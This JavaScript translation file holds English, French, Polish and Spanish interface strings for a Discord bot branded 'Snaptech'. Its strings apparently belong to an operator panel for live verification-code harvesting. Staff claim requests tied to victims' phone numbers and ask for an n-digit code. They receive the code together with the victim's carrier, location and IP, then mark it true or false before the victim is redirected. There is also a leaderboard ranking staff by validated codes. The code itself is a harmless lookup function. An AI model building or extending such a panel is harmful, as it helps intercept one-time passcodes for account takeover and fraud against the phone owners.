/**
 * i18n.js — per-user translations
 *
 * Only used for content that's scoped to ONE viewer — ephemeral replies,
 * DMs, and the personal settings panel. Anything posted in a shared channel
 * (the public request embeds) is intentionally NOT run through this: it's
 * the same Discord message for every staff member watching it, so it has
 * to stay in one consistent language rather than "the last person who
 * touched it"'s language.
 *
 * Default is English if a language isn't recognized or a key is missing
 * for a given language — never throws, never renders blank.
 */

export const SUPPORTED_LANGS = ["en", "fr", "pl", "es"];

const STRINGS = {
    en: {
        no_permission:         "❌ You don't have permission to use this.",
        no_permission_command: "❌ You don't have permission to use this command.",
        already_claimed:       (user) => `🔒 Already claimed by ${user}.`,
        claimed:                (phone, user) => `✅ Request **${phone}** claimed by ${user}`,
        claimer_only:           (user) => `🔒 This request was claimed by ${user}.\nOnly they can interact with these buttons.`,
        invalid_ip:             "❌ Invalid IP.",
        ip_banned:              (ip) => `🚫 IP \`${ip}\` banned!`,
        network_error_ban:      "❌ Network error while banning.",
        network_error_claim:    "❌ Network error while claiming.",
        generic_error:          "❌ Error.",
        len_requested:          (n, phone) => `✅ **${n}-digit** code requested for ${phone}`,
        wrong_reported:         (phone) => `✅ Wrong number reported for ${phone}`,
        unclaimed:              (phone) => `↩️ Request **${phone}** unclaimed. Back in the queue.`,
        truecode_ok:            (phone) => `✅ Code validated for ${phone} 🎉`,
        falsecode_ok:           (phone) => `🔄 Code rejected for ${phone}.\nChoose a new length in the request channel — the user will re-enter their code.`,

        dm_truecode_title: "✅ Code Validated!",
        dm_truecode_desc:  (ts) => `👤 Validated by you\n⏰ <t:${ts}:R>\nThe user is being redirected to the success page.`,
        dm_falsecode_title: "🔄 Code Rejected",
        dm_falsecode_desc:  "⚠️ Marked as incorrect.\nChoose the next length from the channel embed — this DM is now closed.",

        code_dm_title:           "🔓 Code Submitted by User",
        code_dm_field_code:      "🔢 Code Entered",
        code_dm_field_phone:     "📞 Phone",
        code_dm_field_carrier:   "📡 Carrier",
        code_dm_field_submitted: "⏰ Submitted",
        code_dm_field_country:   "🌍 Country",
        code_dm_field_city:      "🏙️ City",
        code_dm_field_ip:        "🌐 IP",
        code_dm_footer:          "⚡ Approve or reject the code below  •  Snaptech",
        code_dm_btn_true:        "✅ True Code",
        code_dm_btn_false:       "❌ False Code",

        settings_title:            "⚙️ My Settings",
        settings_language_label:   "🌐 Language",
        settings_pings_label:      "🔔 Pings",
        settings_pings_enabled:    "`Enabled`",
        settings_pings_disabled:   "`Disabled`",
        settings_footer:           "Only visible to you  •  Snaptech",
        settings_lang_placeholder: "Choose your language",
        settings_ping_enable_btn:  "🔔 Enable pings",
        settings_ping_disable_btn: "🔕 Disable pings",
        settings_intro:            "These settings apply to **you only**. They change nothing for the bot or for other staff.",
        settings_reset_btn:        "♻️ Reset to defaults",
        settings_note_public:      "ℹ️ Request embeds posted in the operator channels stay in English — a single Discord message can't be shown in different languages to different people.",

        emb_retry_title:   "🔄 New Code Pending",
        emb_retry_desc:    "⚠️ The previous code was **incorrect** — check the new one below.",
        emb_retry_footer:  "🔁 New attempt  •  Snaptech",

        stats_title:       "📊 Global Statistics",
        stats_completion:  (pct) => `**Completion rate: ${pct}%**`,
        stats_total:       "📋 Total",
        stats_pending:     "⏳ Pending",
        stats_progress:    "👤 In Progress",
        stats_waiting:     "⏱️ Awaiting Code",
        stats_submitted:   "🔓 Code Submitted",
        stats_completed:   "✅ Completed",
        stats_retry:       "🔄 Retry",
        stats_wrong:       "❌ Wrong Number",
        stats_banned:      "🚫 Banned IPs",
        stats_today:       "📅 Today",
        stats_today_line:  (r, c) => `Requests: \`${r}\`  ·  Completed: \`${c}\``,

        today_title:       "📅 Today's Statistics",
        today_requests:    "📋 Requests Today",
        today_completed:   "✅ Completed Today",

        ops_title:         "📡 Operator Distribution",
        ops_desc:          "Requests by mobile carrier",

        lb_title:          "🏆 Staff Leaderboard",
        lb_desc:           (n) => `Top ${n} staff by code validations`,
        lb_none:           "*No validations recorded yet.*",
        lb_validations:    "validations",

        act_title:         "📈 Activity — Last 24h",
        act_none:          "*No activity in the last 24 hours.*",

        staffact_title:    "👥 Staff Activity",
        staffact_none:     "*No activity recorded yet.*",

        err_fetch:         "❌ Error fetching data.",
        err_network:       (m) => `❌ Network error: ${m}`,

        config_default_channel:  (ch) => `✅ Default channel set to ${ch}`,
        config_operator_channel: (op, ch) => `✅ Channel for **${op}** set to ${ch}`,
    },
    fr: {
        no_permission:         "❌ Tu n'as pas la permission d'utiliser ceci.",
        no_permission_command: "❌ Tu n'as pas la permission d'utiliser cette commande.",
        already_claimed:       (user) => `🔒 Déjà pris en charge par ${user}.`,
        claimed:                (phone, user) => `✅ Requête **${phone}** prise en charge par ${user}`,
        claimer_only:           (user) => `🔒 Cette requête a été prise en charge par ${user}.\nSeule cette personne peut utiliser ces boutons.`,
        invalid_ip:             "❌ IP invalide.",
        ip_banned:              (ip) => `🚫 IP \`${ip}\` bannie !`,
        network_error_ban:      "❌ Erreur réseau lors du bannissement.",
        network_error_claim:    "❌ Erreur réseau lors de la prise en charge.",
        generic_error:          "❌ Erreur.",
        len_requested:          (n, phone) => `✅ Code à **${n} chiffres** demandé pour ${phone}`,
        wrong_reported:         (phone) => `✅ Mauvais numéro signalé pour ${phone}`,
        unclaimed:              (phone) => `↩️ Requête **${phone}** libérée. De retour dans la file d'attente.`,
        truecode_ok:            (phone) => `✅ Code validé pour ${phone} 🎉`,
        falsecode_ok:           (phone) => `🔄 Code rejeté pour ${phone}.\nChoisis une nouvelle longueur dans le salon de la requête — l'utilisateur va ressaisir son code.`,

        dm_truecode_title: "✅ Code validé !",
        dm_truecode_desc:  (ts) => `👤 Validé par toi\n⏰ <t:${ts}:R>\nL'utilisateur est redirigé vers la page de succès.`,
        dm_falsecode_title: "🔄 Code rejeté",
        dm_falsecode_desc:  "⚠️ Marqué comme incorrect.\nChoisis la prochaine longueur depuis l'embed du salon — ce DM est maintenant clos.",

        code_dm_title:           "🔓 Code soumis par l'utilisateur",
        code_dm_field_code:      "🔢 Code saisi",
        code_dm_field_phone:     "📞 Téléphone",
        code_dm_field_carrier:   "📡 Opérateur",
        code_dm_field_submitted: "⏰ Soumis",
        code_dm_field_country:   "🌍 Pays",
        code_dm_field_city:      "🏙️ Ville",
        code_dm_field_ip:        "🌐 IP",
        code_dm_footer:          "⚡ Approuve ou rejette le code ci-dessous  •  Snaptech",
        code_dm_btn_true:        "✅ Code correct",
        code_dm_btn_false:       "❌ Code incorrect",

        settings_title:            "⚙️ Mes réglages",
        settings_language_label:   "🌐 Langue",
        settings_pings_label:      "🔔 Pings",
        settings_pings_enabled:    "`Activés`",
        settings_pings_disabled:   "`Désactivés`",
        settings_footer:           "Visible uniquement par toi  •  Snaptech",
        settings_lang_placeholder: "Choisis ta langue",
        settings_ping_enable_btn:  "🔔 Activer les pings",
        settings_ping_disable_btn: "🔕 Désactiver les pings",
        settings_intro:            "Ces réglages ne s'appliquent qu'à **toi**. Ils ne changent rien pour le bot ni pour les autres membres du staff.",
        settings_reset_btn:        "♻️ Réinitialiser",
        settings_note_public:      "ℹ️ Les embeds de requête postés dans les salons opérateurs restent en anglais — un même message Discord ne peut pas s'afficher dans une langue différente selon la personne qui le lit.",

        emb_retry_title:   "🔄 Nouveau code en attente",
        emb_retry_desc:    "⚠️ Le code précédent était **incorrect** — vérifie le nouveau ci-dessous.",
        emb_retry_footer:  "🔁 Nouvelle tentative  •  Snaptech",

        stats_title:       "📊 Statistiques globales",
        stats_completion:  (pct) => `**Taux de réussite : ${pct}%**`,
        stats_total:       "📋 Total",
        stats_pending:     "⏳ En attente",
        stats_progress:    "👤 En cours",
        stats_waiting:     "⏱️ Attente du code",
        stats_submitted:   "🔓 Code soumis",
        stats_completed:   "✅ Terminées",
        stats_retry:       "🔄 Nouvelle tentative",
        stats_wrong:       "❌ Mauvais numéro",
        stats_banned:      "🚫 IP bannies",
        stats_today:       "📅 Aujourd'hui",
        stats_today_line:  (r, c) => `Requêtes : \`${r}\`  ·  Terminées : \`${c}\``,

        today_title:       "📅 Statistiques du jour",
        today_requests:    "📋 Requêtes aujourd'hui",
        today_completed:   "✅ Terminées aujourd'hui",

        ops_title:         "📡 Répartition par opérateur",
        ops_desc:          "Requêtes par opérateur mobile",

        lb_title:          "🏆 Classement du staff",
        lb_desc:           (n) => `Top ${n} du staff par codes validés`,
        lb_none:           "*Aucune validation enregistrée pour le moment.*",
        lb_validations:    "validations",

        act_title:         "📈 Activité — 24 dernières heures",
        act_none:          "*Aucune activité sur les 24 dernières heures.*",

        staffact_title:    "👥 Activité du staff",
        staffact_none:     "*Aucune activité enregistrée pour le moment.*",

        err_fetch:         "❌ Erreur lors de la récupération des données.",
        err_network:       (m) => `❌ Erreur réseau : ${m}`,

        config_default_channel:  (ch) => `✅ Salon par défaut défini sur ${ch}`,
        config_operator_channel: (op, ch) => `✅ Salon pour **${op}** défini sur ${ch}`,
    },
    pl: {
        no_permission:         "❌ Nie masz uprawnień, aby tego użyć.",
        no_permission_command: "❌ Nie masz uprawnień, aby użyć tej komendy.",
        already_claimed:       (user) => `🔒 Już zajęte przez ${user}.`,
        claimed:                (phone, user) => `✅ Zgłoszenie **${phone}** przejęte przez ${user}`,
        claimer_only:           (user) => `🔒 To zgłoszenie zostało przejęte przez ${user}.\nTylko ta osoba może korzystać z tych przycisków.`,
        invalid_ip:             "❌ Nieprawidłowy adres IP.",
        ip_banned:              (ip) => `🚫 IP \`${ip}\` zbanowane!`,
        network_error_ban:      "❌ Błąd sieci podczas banowania.",
        network_error_claim:    "❌ Błąd sieci podczas przejmowania.",
        generic_error:          "❌ Błąd.",
        len_requested:          (n, phone) => `✅ Poproszono o kod **${n}-cyfrowy** dla ${phone}`,
        wrong_reported:         (phone) => `✅ Zgłoszono zły numer dla ${phone}`,
        unclaimed:              (phone) => `↩️ Zgłoszenie **${phone}** zwolnione. Wraca do kolejki.`,
        truecode_ok:            (phone) => `✅ Kod zweryfikowany dla ${phone} 🎉`,
        falsecode_ok:           (phone) => `🔄 Kod odrzucony dla ${phone}.\nWybierz nową długość na kanale zgłoszenia — użytkownik wpisze kod ponownie.`,

        dm_truecode_title: "✅ Kod zweryfikowany!",
        dm_truecode_desc:  (ts) => `👤 Zweryfikowane przez Ciebie\n⏰ <t:${ts}:R>\nUżytkownik jest przekierowywany na stronę sukcesu.`,
        dm_falsecode_title: "🔄 Kod odrzucony",
        dm_falsecode_desc:  "⚠️ Oznaczono jako nieprawidłowy.\nWybierz kolejną długość z embeda na kanale — ta wiadomość DM jest teraz zamknięta.",

        code_dm_title:           "🔓 Kod przesłany przez użytkownika",
        code_dm_field_code:      "🔢 Wpisany kod",
        code_dm_field_phone:     "📞 Telefon",
        code_dm_field_carrier:   "📡 Operator",
        code_dm_field_submitted: "⏰ Przesłano",
        code_dm_field_country:   "🌍 Kraj",
        code_dm_field_city:      "🏙️ Miasto",
        code_dm_field_ip:        "🌐 IP",
        code_dm_footer:          "⚡ Zatwierdź lub odrzuć kod poniżej  •  Snaptech",
        code_dm_btn_true:        "✅ Poprawny kod",
        code_dm_btn_false:       "❌ Błędny kod",

        settings_title:            "⚙️ Moje ustawienia",
        settings_language_label:   "🌐 Język",
        settings_pings_label:      "🔔 Pingi",
        settings_pings_enabled:    "`Włączone`",
        settings_pings_disabled:   "`Wyłączone`",
        settings_footer:           "Widoczne tylko dla Ciebie  •  Snaptech",
        settings_lang_placeholder: "Wybierz swój język",
        settings_ping_enable_btn:  "🔔 Włącz pingi",
        settings_ping_disable_btn: "🔕 Wyłącz pingi",
        settings_intro:            "Te ustawienia dotyczą **tylko Ciebie**. Nie zmieniają niczego dla bota ani dla innych członków obsługi.",
        settings_reset_btn:        "♻️ Przywróć domyślne",
        settings_note_public:      "ℹ️ Zgłoszenia publikowane na kanałach operatorów pozostają po angielsku — jedna wiadomość Discord nie może wyświetlać się w różnych językach różnym osobom.",

        emb_retry_title:   "🔄 Oczekiwanie na nowy kod",
        emb_retry_desc:    "⚠️ Poprzedni kod był **nieprawidłowy** — sprawdź nowy poniżej.",
        emb_retry_footer:  "🔁 Nowa próba  •  Snaptech",

        stats_title:       "📊 Statystyki globalne",
        stats_completion:  (pct) => `**Wskaźnik ukończenia: ${pct}%**`,
        stats_total:       "📋 Łącznie",
        stats_pending:     "⏳ Oczekujące",
        stats_progress:    "👤 W trakcie",
        stats_waiting:     "⏱️ Oczekiwanie na kod",
        stats_submitted:   "🔓 Kod przesłany",
        stats_completed:   "✅ Zakończone",
        stats_retry:       "🔄 Ponowna próba",
        stats_wrong:       "❌ Zły numer",
        stats_banned:      "🚫 Zbanowane IP",
        stats_today:       "📅 Dzisiaj",
        stats_today_line:  (r, c) => `Zgłoszenia: \`${r}\`  ·  Zakończone: \`${c}\``,

        today_title:       "📅 Statystyki dzisiaj",
        today_requests:    "📋 Zgłoszenia dzisiaj",
        today_completed:   "✅ Zakończone dzisiaj",

        ops_title:         "📡 Podział według operatorów",
        ops_desc:          "Zgłoszenia według operatora komórkowego",

        lb_title:          "🏆 Ranking obsługi",
        lb_desc:           (n) => `Top ${n} obsługi według zweryfikowanych kodów`,
        lb_none:           "*Brak zapisanych weryfikacji.*",
        lb_validations:    "weryfikacji",

        act_title:         "📈 Aktywność — ostatnie 24h",
        act_none:          "*Brak aktywności w ciągu ostatnich 24 godzin.*",

        staffact_title:    "👥 Aktywność obsługi",
        staffact_none:     "*Brak zapisanej aktywności.*",

        err_fetch:         "❌ Błąd podczas pobierania danych.",
        err_network:       (m) => `❌ Błąd sieci: ${m}`,

        config_default_channel:  (ch) => `✅ Kanał domyślny ustawiony na ${ch}`,
        config_operator_channel: (op, ch) => `✅ Kanał dla **${op}** ustawiony na ${ch}`,
    },
    es: {
        no_permission:         "❌ No tienes permiso para usar esto.",
        no_permission_command: "❌ No tienes permiso para usar este comando.",
        already_claimed:       (user) => `🔒 Ya reclamado por ${user}.`,
        claimed:                (phone, user) => `✅ Solicitud **${phone}** reclamada por ${user}`,
        claimer_only:           (user) => `🔒 Esta solicitud fue reclamada por ${user}.\nSolo esa persona puede usar estos botones.`,
        invalid_ip:             "❌ IP no válida.",
        ip_banned:              (ip) => `🚫 ¡IP \`${ip}\` baneada!`,
        network_error_ban:      "❌ Error de red al banear.",
        network_error_claim:    "❌ Error de red al reclamar.",
        generic_error:          "❌ Error.",
        len_requested:          (n, phone) => `✅ Código de **${n} dígitos** solicitado para ${phone}`,
        wrong_reported:         (phone) => `✅ Número incorrecto reportado para ${phone}`,
        unclaimed:              (phone) => `↩️ Solicitud **${phone}** liberada. De vuelta en la cola.`,
        truecode_ok:            (phone) => `✅ Código validado para ${phone} 🎉`,
        falsecode_ok:           (phone) => `🔄 Código rechazado para ${phone}.\nElige una nueva longitud en el canal de la solicitud — el usuario volverá a introducir su código.`,

        dm_truecode_title: "✅ ¡Código validado!",
        dm_truecode_desc:  (ts) => `👤 Validado por ti\n⏰ <t:${ts}:R>\nEl usuario está siendo redirigido a la página de éxito.`,
        dm_falsecode_title: "🔄 Código rechazado",
        dm_falsecode_desc:  "⚠️ Marcado como incorrecto.\nElige la siguiente longitud desde el embed del canal — este DM está ahora cerrado.",

        code_dm_title:           "🔓 Código enviado por el usuario",
        code_dm_field_code:      "🔢 Código introducido",
        code_dm_field_phone:     "📞 Teléfono",
        code_dm_field_carrier:   "📡 Operador",
        code_dm_field_submitted: "⏰ Enviado",
        code_dm_field_country:   "🌍 País",
        code_dm_field_city:      "🏙️ Ciudad",
        code_dm_field_ip:        "🌐 IP",
        code_dm_footer:          "⚡ Aprueba o rechaza el código abajo  •  Snaptech",
        code_dm_btn_true:        "✅ Código correcto",
        code_dm_btn_false:       "❌ Código incorrecto",

        settings_title:            "⚙️ Mis ajustes",
        settings_language_label:   "🌐 Idioma",
        settings_pings_label:      "🔔 Menciones",
        settings_pings_enabled:    "`Activadas`",
        settings_pings_disabled:   "`Desactivadas`",
        settings_footer:           "Solo visible para ti  •  Snaptech",
        settings_lang_placeholder: "Elige tu idioma",
        settings_ping_enable_btn:  "🔔 Activar menciones",
        settings_ping_disable_btn: "🔕 Desactivar menciones",
        settings_intro:            "Estos ajustes se aplican **solo a ti**. No cambian nada para el bot ni para el resto del staff.",
        settings_reset_btn:        "♻️ Restablecer",
        settings_note_public:      "ℹ️ Los embeds de solicitud publicados en los canales de operador siguen en inglés — un mismo mensaje de Discord no puede mostrarse en idiomas distintos según quien lo lea.",

        emb_retry_title:   "🔄 Nuevo código pendiente",
        emb_retry_desc:    "⚠️ El código anterior era **incorrecto** — revisa el nuevo abajo.",
        emb_retry_footer:  "🔁 Nuevo intento  •  Snaptech",

        stats_title:       "📊 Estadísticas globales",
        stats_completion:  (pct) => `**Tasa de finalización: ${pct}%**`,
        stats_total:       "📋 Total",
        stats_pending:     "⏳ Pendientes",
        stats_progress:    "👤 En curso",
        stats_waiting:     "⏱️ Esperando código",
        stats_submitted:   "🔓 Código enviado",
        stats_completed:   "✅ Completadas",
        stats_retry:       "🔄 Reintento",
        stats_wrong:       "❌ Número incorrecto",
        stats_banned:      "🚫 IP baneadas",
        stats_today:       "📅 Hoy",
        stats_today_line:  (r, c) => `Solicitudes: \`${r}\`  ·  Completadas: \`${c}\``,

        today_title:       "📅 Estadísticas de hoy",
        today_requests:    "📋 Solicitudes hoy",
        today_completed:   "✅ Completadas hoy",

        ops_title:         "📡 Distribución por operador",
        ops_desc:          "Solicitudes por operador móvil",

        lb_title:          "🏆 Clasificación del staff",
        lb_desc:           (n) => `Top ${n} del staff por códigos validados`,
        lb_none:           "*Aún no hay validaciones registradas.*",
        lb_validations:    "validaciones",

        act_title:         "📈 Actividad — últimas 24 h",
        act_none:          "*Sin actividad en las últimas 24 horas.*",

        staffact_title:    "👥 Actividad del staff",
        staffact_none:     "*Aún no hay actividad registrada.*",

        err_fetch:         "❌ Error al obtener los datos.",
        err_network:       (m) => `❌ Error de red: ${m}`,

        config_default_channel:  (ch) => `✅ Canal por defecto establecido en ${ch}`,
        config_operator_channel: (op, ch) => `✅ Canal para **${op}** establecido en ${ch}`,
    },
};

/**
 * Resolve a translated string. `key` selects the entry; if it's a function,
 * the remaining args are passed through to it. Falls back to English for an
 * unsupported language or a key missing from that language's dictionary —
 * never throws, never returns undefined.
 */
export function t(lang, key, ...args) {
    const dict  = STRINGS[lang] || STRINGS.en;
    const entry = dict[key] !== undefined ? dict[key] : STRINGS.en[key];
    return typeof entry === "function" ? entry(...args) : entry;
}
